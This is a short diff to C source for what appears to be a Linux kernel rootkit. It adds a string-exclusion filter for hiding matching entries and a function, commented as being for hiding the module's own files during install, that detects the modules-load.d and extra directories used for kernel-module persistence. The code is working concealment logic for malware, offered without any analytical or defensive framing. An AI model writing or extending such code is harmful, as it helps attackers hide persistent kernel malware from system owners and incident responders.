@@ -1,13 +1,22 @@
+#include <linux/fs.h>
+#include <linux/file.h>
 #include <linux/string.h>
 
 #include "utils/excludes/string_filtering.h"
 
 int str_entry_is_excluded(const char *entry) {
+    if (STRING_EXCLUDES[0] == '\0') { // no string excludes are set
+        return 0;
+    }
+
     char excludes[] = STRING_EXCLUDES; // copy to a mutable array
     char *token;
     char *temp_excludes = excludes; // `strsep` modifies the original string
 
     while ((token = strsep(&temp_excludes, ",")) != NULL) {
+        if (token[0]== '\0') { // skip empty entries due to misplaced commas i.e "str,"
+            continue;
+        }
         if (strstr(entry, token)) {
             return 1;
         }
@@ -27,3 +36,20 @@ bool is_numeric(const char *str) {
     return true;
 }
 
+bool is_mod_directory(unsigned int fd) { // will be used to hide the module files if installing
+    struct file *file = fget(fd);
+    if (!file) {
+        return false;
+    }
+
+    struct dentry *dentry = file->f_path.dentry;
+    const char *dname = dentry->d_name.name;
+
+    bool match = false;
+    if (strcmp(dname, "modules-load.d") == 0 || strcmp(dname, "extra") == 0) {
+        match = true;
+    }
+
+    fput(file);
+    return match;
+}
